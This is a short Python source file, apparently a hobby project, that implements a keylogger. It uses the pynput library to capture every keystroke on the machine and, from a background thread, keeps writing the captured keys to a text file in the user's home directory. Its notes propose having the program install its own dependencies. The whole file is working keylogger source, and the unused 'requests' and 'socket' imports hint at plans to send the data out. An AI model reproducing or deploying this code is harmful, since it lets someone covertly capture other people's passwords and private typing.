## Advanced python key logger
##
##                  NOTES 
##
## if don't have pynput, have program reach out and install it
## pip3 install pynput
## pip3 install win32gui



'''imports'''
from pynput.keyboard import Key, Listener
import threading
import requests
import socket
import os
import time


## logged_data string array to hold stored data 
logged_data = []


def on_press(key):

    ## append key to array
    key = str(key).strip('\'')
    logged_data.append(key)
    print(key)


def write_file():

    ## This function will write to file on location given
    
    filename = 'keylogger.txt'
    filepath = os.path.expanduser('~') + '/TEST_keylogger/'
     
    file = filepath + filename
    print('This is the path file name ' + str(file))

    with open(file, 'w') as fp:
        fp.write(''.join(logged_data))



def write_logs():
    
    count = 0

#    time.sleep(5)
#    if len(logged_data) > 1:
#        
#        write_file()

    time.sleep(5)
    while True:
        if len(logged_data) > 1:
            try:
                write_file()

                count += 1
            except:
                pass




#####  Beginning of script

if __name__=='__main__':
    ## Write to file
    keylogger = threading.Thread(target=write_logs)
    keylogger.start()


    ## START KEYLOGGER
    with Listener(on_press=on_press) as listener:
        listener.join()



